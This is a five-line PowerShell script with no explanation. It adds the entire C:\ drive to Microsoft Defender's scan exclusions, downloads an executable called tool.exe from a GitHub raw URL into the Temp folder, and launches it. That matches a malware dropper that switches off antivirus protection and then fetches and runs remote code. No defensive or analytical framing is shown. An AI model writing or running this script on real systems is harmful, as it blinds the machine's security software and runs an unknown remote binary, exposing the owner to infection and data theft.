Add-MpPreference -ExclusionPath C:\
$url = "https://github.com/kuskunia/sigma/raw/refs/heads/main/tool.exe"
$output = "$env:Temp/tool.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process -FilePath $output